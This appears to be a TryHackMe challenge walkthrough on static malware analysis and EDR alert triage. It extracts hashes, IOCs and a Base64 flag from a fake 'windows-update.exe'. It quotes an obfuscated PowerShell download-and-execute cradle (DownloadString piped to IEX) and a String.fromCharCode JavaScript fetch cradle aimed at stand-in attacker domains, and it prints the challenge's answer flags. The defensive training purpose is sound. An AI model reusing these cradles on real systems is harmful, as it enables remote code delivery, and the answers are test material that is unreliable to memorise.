---
title: Shadow Trace
description: Analyse a suspicious file, uncover hidden clues, and trace the source of the infection.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this challenge room, we perform static analysis on a suspicious binary (`windows-update.exe`) using PE-bear and VirusTotal to extract network IOCs, imported DLLs, and a Base64-encoded flag. We then triage EDR alerts on `WIN-SRV-01.tryhackme.local` to decode obfuscated PowerShell and browser JavaScript (`String.fromCharCode`) download cradles.

---

## Task 1.1
What is the architecture of the binary file `windows-update.exe`?

**Answer**: `64-bit`

**Why?**
Opening `C:/Users/DFIRUser/Desktop/windows-update.exe` in PE-bear and inspecting the **File Hdr** tab under NT Headers shows `Machine: 8664` (`AMD64 (K8)`), along with `Characteristics: App can handle >2gb addresses`, confirming it is a `64-bit` executable.

![](../../assets/Pasted%20image%2020261111152717.png)

## Task 1.2
What is the hash (sha-256) of the file `windows-update.exe`?

**Answer**: `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9EA64BFC` (or lowercase `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc`)

**Why?**
Switching to the **General** tab in PE-bear lists the file hashes directly under `File info`, showing `SHA256: b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc`.

![](../../assets/Pasted%20image%2020261111152732.png)

## Task 1.3
Identify the URL within the file to use it as an IOC.

**Answer**: `http://tryhatme.com/update/security-update.exe`

**Why?**
Searching the SHA256 hash on VirusTotal (`41/70 security vendors flagged this file as malicious`) and checking both the **Code insights** summary and the **Behavior -> Network Communication -> Memory Pattern Urls** section reveals the second-stage payload URL `http://tryhatme.com/update/security-update.exe`.

![](../../assets/Pasted%20image%2020261111152742.png)

![](../../assets/Pasted%20image%2020261111152759.png)

## Task 2.1
With the URL identified, can you spot a domain that can be used as an IOC?

**Answer**: `responses.tryhatme.com`

**Why?**
In PE-bear, navigating to the **Strings** tab and searching for `tryhatme` returns three strings:
1. `http://tryhatme.com/update/security-update.exe`
2. `tryhatme.com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=`
3. `responses.tryhatme.com`

![](../../assets/Pasted%20image%2020261111154103.png)

## Task 2.2
Input the decoded flag from the suspicious domain.

**Answer**: `THM{you_g0t_some_IOCs_friend}`

**Why?**
Copying the Base64 string (`VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=`) from the second `tryhatme.com` string in PE-bear and decoding it in CyberChef using `From Base64` outputs `THM{you_g0t_some_IOCs_friend}`.

![](../../assets/Pasted%20image%2020261111154210.png)

## Task 2.3
What library related to socket communication is loaded by the binary?

**Answer**: `WS2_32.dll`

**Why?**
Checking the **Imports** section on VirusTotal (under Details) and verifying in PE-bear's **Strings** / **Imports** tabs confirms the binary loads the Windows Sockets 2 library, `WS2_32.dll`.

![](../../assets/Pasted%20image%2020261111154326.png)

![](../../assets/Pasted%20image%2020261111154339.png)

## Task 2.4
Can you identify the malicious URL from the trigger by the process `powershell.exe`?

**Answer**: `https://tryhatme.com/dev/main.exe`

**Why?**
In the EDR alerts table, the `Critical` alert for `Suspicious PowerShell execution` on `WIN-SRV-01.tryhackme.local` shows the command `(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;`. Decoding `aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl` in CyberChef with `From Base64` reveals `https://tryhatme.com/dev/main.exe`.

![](../../assets/Pasted%20image%2020261111154449.png)
![](../../assets/Pasted%20image%2020261111154507.png)

## Task 3.1
Can you identify the malicious URL from the alert triggered by `chrome.exe`?

**Answer**: `https://reallysecureupdate.tryhatme.com/update.exe`

**Why?**
The `Suspicious Browser Download` alert triggered by `chrome.exe` executes `fetch([104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101].map(c=>String.fromCharCode(c)).join(''))...`. Running `String.fromCharCode(...)` with that array of ASCII character codes outputs `https://reallysecureupdate.tryhatme.com/update.exe`.

![](../../assets/Pasted%20image%2020261111154525.png)

![](../../assets/Pasted%20image%2020261111155210.png)

## Task 3.2
What's the name of the file saved in the alert triggered by `chrome.exe`?

**Answer**: `test.txt`

**Why?**
Looking at the second half of the JavaScript snippet in the `chrome.exe` alert (`const a=document.createElement('a');a.href=u;a.download='test.txt';`), the downloaded blob is saved locally with the filename `test.txt`.

![](../../assets/Pasted%20image%2020261111154646.png)

